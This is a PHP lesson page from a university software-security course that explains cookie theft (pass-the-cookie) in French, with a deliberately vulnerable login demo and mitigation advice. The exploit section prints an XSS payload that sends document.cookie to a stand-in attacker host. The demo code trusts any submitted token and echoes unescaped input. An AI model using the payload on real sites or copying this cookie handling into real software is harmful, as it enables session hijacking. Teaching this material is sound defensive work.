<?php
/*****************************************************
 * cookies.php                                       *
 *                                                   *
 * Project : Session project                         *
 * Course : GLO-7009 - Software security             *
 * Team : Team 2                                     *
 * Session : Winter 2024                             *
 * University : Laval University                     *
 * Version : 1.0                                     *
 *****************************************************/

/*****************************************************
 *                       MODEL                       *
 *****************************************************/
require("model.php");

/*****************************************************
 *               COOKIES AUTHENTICATION              *
 *****************************************************/
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["update"]) && isset($_POST["cookie"])) {
        setcookie("userToken", $_POST["cookie"], time() + (60 * 60 * 24));
        $_COOKIE["userToken"] = $_POST["cookie"];
        $update = true;
    } else if (isset($_POST["connect"])) {
        $error = array();

        if (isset($_POST["email"])) {
            if (!filter_var($_POST["email"], FILTER_VALIDATE_EMAIL)) {
               $error["email"] = "Veuillez entrer une adresse courriel valide.";
            }
        } else {
            $error["email"] = "Veuillez entrer une adresse courriel.";
        }

        if (empty($_POST["password"])) {
            $error["password"] = "Veuillez entrer un mot de passe.";
        }

        if (!isset($error["email"]) && !isset($error["password"])) {
            $token = login($_POST["email"], $_POST["password"]);

            if (isset($token)) {
                if (isset($_POST["persistent"])) {
                    setcookie("userToken", $token, time() + (60 * 60 * 24 * 30));
                } else {
                    setcookie("userToken", $token, time() + (60 * 60 * 24));
                }
                $_COOKIE["userToken"] = $token;
            } else {
                $error["token"] = "Nom d'utilisateur ou mot de passe incorrect.";
            }
        }
    } else if (isset($_POST["disconnect"])) {
        logout($_COOKIE["userToken"]);
        setcookie("userToken", "", time() - 3600);
        $_COOKIE["userToken"] = "";
    }
}

/*****************************************************
 *                      CONTENT                      *
 *****************************************************/
$presentation = '<div class="table">
    <div class="row split">
        <section>
            <h2>Catégorie</h2>
            <p>Vulnérabilités dans les mécanismes d’authentification</p>
        </section>
        <section>
            <h2>Impact potentiel</h2>
            <p>Confidentialité et intégrité</p>
        </section>
    </div>
    <section class="row">
        <h2>Description</h2>
        <p>On utilise des jetons (tokens) pour éviter d’enregistrer les identifiants en clair sur le navigateur de
        l’utilisateur. On doit enregistrer le jeton de connexion sur l’ordinateur local pour maintenir la connexion. On
        peut effectuer cet enregistrement à l’aide d’un témoin (cookie) qui sera conservé localement sur le
        navigateur.</p>
        <p>La subtilisation des témoins est une vulnérabilité permettant à l’usurpateur de récupérer les témoins pour
        contourner l’authentification habituelle. Autrement dit, l’usurpateur récupère les témoins, et se fait passer
        pour la victime dans le but d’accéder à des informations sensibles. Cette attaque est aussi nommée
        Pass-the-Cookie ou Pass-the-Hash. Nous avons réussi à exploiter cette attaque sur un compte Google par simple
        copie des témoins. Cela démontre que même les géants du web ne sont pas à l’abri de cette attaque.</p>
    </section>
    <section class="row">
        <h2>Objectifs</h2>
         <ul class="list">
            <li>Contourner les mesures d’authentification.</li>
            <li>Accéder à des informations sur des utilisateurs légitimes.</li>
            <li>Effectuer des actes répréhensibles sur les utilisateurs.</li>
        </ul>
    </section>
    <section class="row">
        <h2>Causes</h2>
        <ul class="list">
            <li>La provenance du jeton n’est pas vérifiée.</li>
            <li>La création du témoin n’est pas suffisamment sécurisée.</li>
        </ul>
    </section>
    <section class="row">
        <h2>Exemples marquants</h2>
        <ul class="list">
            <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44151#match-9099598" target="_blank">Reprise Software
            (CVE-2021-44151)</a><br />
                Une attaque par vol de témoins de session est survenue sur l’hébergeur de licence Reprise Software.
                Cette entreprise n’utilisait que des témoins qui n’avaient qu’une courte longueur (4 caractères
                hexadécimaux pour Windows ou 8 pour le système Linux).
            </li>
            <li><a href="https://www.cve.news/cve-2023-5723/" target="_blank">Firefox Vulnerability (CVE-2023-5723)</a>
            <br />
                Une attaque par vol de cookies est possible sur les versions 119 et antérieures de Firefox. L’appel à la
                fonction JavaScript ‘document.cookie’ peut permettre à l’attaquant d’avoir temporairement accès aux
                témoins stockés dans le navigateur en exécutant un script provenant d’un site.
            </li>
        </ul>
    </section>
</div>';

$demonstration = '<div class="split">
    <form method="POST">
        <div>
            <h2>Scénario</h2>
            '.((isset($_COOKIE["userToken"]) && is_logged_in($_COOKIE["userToken"])) ? '
            <p class="success">L’usager est connecté en tant que <strong>'.
            get_logged_in_user_fullname($_COOKIE["userToken"]).'</strong>.</p>' : '
            <div class="form-group">
                '.((isset($error["token"])) ? '<div class="alert alert-danger">'.$error["token"].'</div>' : '').'
            </div>
            <div class="form-group">
                <label for="email">Adresse email</label>
                '.((isset($error["email"])) ? '<div class="alert alert-danger">'.$error["email"].'</div>' : '').'
                <input id="email" class="form-control'.((isset($error["email"])) ? ' invalid' : '').'" name="email"
                type="email"'.((isset($error["email"])) ? ' value="'.$_POST["email"].'"' : '').' />
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                '.((isset($error["password"])) ? '<div class="alert alert-danger">'.$error["password"].'</div>' : '').'
                <input id="password" class="form-control'.((isset($error["password"])) ? ' invalid' : '').'" name=
                "password" type="password" />
            </div>
            <div class="form-group">
                <input id="persistent" class="form-check" name="persistent" type="checkbox" />
                <label for="persistent">Se souvenir de moi</label>
            </div>
            ').'
        </div>
        <footer>
            '.((isset($_COOKIE["userToken"]) && is_logged_in($_COOKIE["userToken"])) ? '
            <button name="disconnect" type="submit">Déconnexion</button>
            ' : '
            <button name="connect" type="submit">Connexion</button>
            ').'
        </footer>
    </form>
    <form method="POST">
        <div>
            <h2>Configuration</h2>
            '.((isset($update)) ?
            '<div class="form-group">
                <div class="alert alert-success">Le témoin a bien été modifié.</div>
            </div>
            ' : '').'
            <div class="form-group">
                <label for="cookie">Témoin (cookie)</label>
                <input id="cookie" class="form-control" name="cookie" type="text" value="'.$_COOKIE["userToken"].'" />
            </div>
        </div>
        <footer>
            <button name="update" type="submit">Modifier</button>
        </footer>
    </form>
</div>';

$exploit = '<div>
    <section>
        <h2>Conditions préalables pour l’exploitation</h2>
        <ul class="list">
            <li>Les témoins ne sont pas vérifiés suffisamment.</li>
        </ul>
    </section>
    <section>
        <h2>Méthodes d’exploitation</h2>
        <ul class="list">
            <li>Exporter et importer les témoins.</li>
            <li>Générer aléatoirement des témoins par force brute.</li>
            <li>Injecter du code XSS dans le navigateur de la victime.</li>
        </ul>
    </section>
    <section>
        <h2>Exécution de l’attaque</h2>
        <ul class="list">
            <li>Subtiliser les témoins.</li>
            <li>Importer les témoins dans un navigateur.</li>
            <li>Modifier les propriétés du navigateur pour correspondre à ceux de la victime, si besoin.</li>
        </ul>
    </section>
    <section>
        <h2>Analyse d’un scénario vulnérable</h2>
        <p>Pour expliquer cette attaque, nous allons parcourir, étape par étape, l’authentification dans une application
        qui ne vérifie que le témoin de l’utilisateur connecté.</p>
        <p>Lorsque l’utilisateur se connecte avec ses identifiants, une requête de demande de connexion est envoyée au
        serveur. Ce dernier vérifie ensuite les identifiants avec les informations existantes et génère un jeton lorsque
        ces dernières sont valides.</p>
        <p>Prenons les identifiants suivants :</p>
        <table>
            <tbody>
                <tr>
                    <th>Adresse courriel</th>
                    <td>melissaingram@test.ulaval.ca</td>
                </tr>
                <tr>
                    <th>Mot de passe</th>
                    <td>ahfoo5Iuj</td>
                </tr>
            </tbody>
        </table>
        <p>Ces identifiants pourraient générer le jeton suivant :</p>
        <div class="border">
            <p>SguoZrBeijjAH6EhAUO4LxQFjZ1bucVdFEIManrTgtAwJiwZ2j</p>
        </div>
        <p>Dans le cas où un attaquant subtiliserait le jeton en utilisant l’une des méthodes d’exploitation évoqués
        précédemment, cela pourrait mener au contournement de l’authentification. Une fois que l’attaquant a réussi à
        copier et à importer le témoin sur son navigateur, il pourra se faire passer pour la victime.</p>
        <p>Cette récupération pourrait être réalisé par injection XSS, dont voici un exemple :</p>
        <pre class="line-numbers"><code class="language-html">&lt;script&gt;
    document.location="http://attaquant.com/vol_cookies.php?cookie=" + document.cookie;
&lt;/script&gt;</code></pre>
        <p>Ce code transmet la totalité des témoins stockés dans le navigateur à la page ‘vol_cookies.php’ de
        l’attaquant à l’aide d’une requête GET dont la clé est dénommée ‘cookie’.</p>
    </section>
</div>';

$fix = '<div>
    <section>
        <h2>Mesures de prévention</h2>
        <p>Il n’existe pas de mesure toute faite pour corriger cette vulnérabilité, cependant nous pouvons tout de même
        atténuer les risques. Voici quelques pistes de correction :</p>
        <ul class="list">
            <li><strong>Mettre en place une politique de sécurité de contenu (CSP)</strong><br />
                La mise en place d’une politique CSP permet de limiter l’attaque par vol des témoins de connexion, tel
                que décrit dans la section de correction d’une <a href="'.$config["site_link"]."/".$menu[1]["folder"].
                "/".$menu[1]["files"][1]["name"].'?view=fix">injection XSS</a>.
            </li>
            <li><strong>Vérifier l’agent utilisateur du navigateur</strong><br />
                <p>L’agent utilisateur est une chaîne de caractères qui permet d’identifier le navigateur.</p>
                <p>Un exemple de cet agent pourrait être :</p>
                <div class="border">
                    Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
                </div>
                <p>Cette chaîne peut être décrite de la façon suivante :</p>
                <ul>
                    <li><strong>Mozilla/5.0 :</strong> Cette partie de la chaîne permet d’indiquer que le navigateur est
                    compatible avec Mozilla. Elle est restée présente pour des raisons historiques et tous les
                    navigateurs l’implémente aujourd’hui.</li>
                    <li><strong>(X11; Ubuntu; Linux x86_64; rv :35.0) :</strong> Cette chaîne contient la plateforme, le
                    système d’exploitation et la version ou révision du navigateur.</li>
                    <li><strong>Gecko/20100101 :</strong> Cet partie présente la version et le moteur de rendu du
                    navigateur.</li>
                    <li><strong>Firefox/35.0 :</strong> Pour terminer, cette dernière sous-chaîne présente le nom du
                    navigateur et sa version publique.</li>
                </ul>
            </li>
            <li><strong>Rotation et expiration des témoins</strong><br />
                Cette méthode consiste à ajouter d’autres informations lors de la génération du jeton. On pourrait par
                exemple, lier le jeton avec l’identificateur de l’utilisateur, ce qui complexifierait une attaque par
                force brute. On peut aussi lier le jeton avec son adresse IP, cela permet d’identifier l’utilisateur.
                Lorsque l’utilisateur quitte son réseau ou un attaquant d’un autre réseau arrive à récupérer le témoin,
                il y aura déconnexion.
            </li>
            <li><strong>Mettre en œuvre des attributs sécurisés</strong><br />
                Des attributs peuvent être ajouté aux témoins dans le but d’empêcher l’exploitation par une personne
                extérieure. Parmi les plus importants, on retrouve :
                <ul>
                    <li><strong>HttpOnly</strong><br />
                        Il permet de limiter l’exploitation d’injections XSS en bloquant la récupération des témoins qui
                        seraient récupérés grâce à la méthode ‘document.cookie’. Cette limitation est rendue possible
                        lorsqu’il a une valeur établie à true.
                    </li>
                    <li><strong>SameSite</strong><br />
                        Le témoin n’est accessible que depuis le site défini par l’attribut Domain. Les valeurs
                        possibles sont :
                        <ul>
                            <li><strong>strict :</strong> Elle est la plus sécurisée et prévient de l’exploitation par
                            des scripts d’injections XSS.</li>
                            <li><strong>lax :</strong> Elle bloque l’envoi du témoin, si ce dernier ne provient pas du
                            site d’origine. C’est un compromis entre la sécurité et l’usage.</li>
                            <li><strong>none :</strong> Elle n’offre aucune sécurité et peut être utilisée pour envoyer
                            de l’information à tous les sites.</li>
                        </ul>
                    </li>
                </ul>
            </li>
        </ul>
    </section>
    <section>
        <h2>Documentation et ressources</h2>
        <ul class="list">
            <li><a href=
            "https://elsefix.com/fr/what-is-a-pass-the-cookie-attack-how-to-stay-logged-in-to-websites-safely.html"
            target="_blank">Pass-the-Cookie</a></li>
            <li><a href="https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/" target="_blank">Pass-the-Hash</a>
            </li>
        </ul>
    </section>
</div>';

/*****************************************************
 *                    RENDER PAGE                    *
 *****************************************************/
echo render_malicious("Authentification par cookies", $presentation, $demonstration, $exploit, $fix);
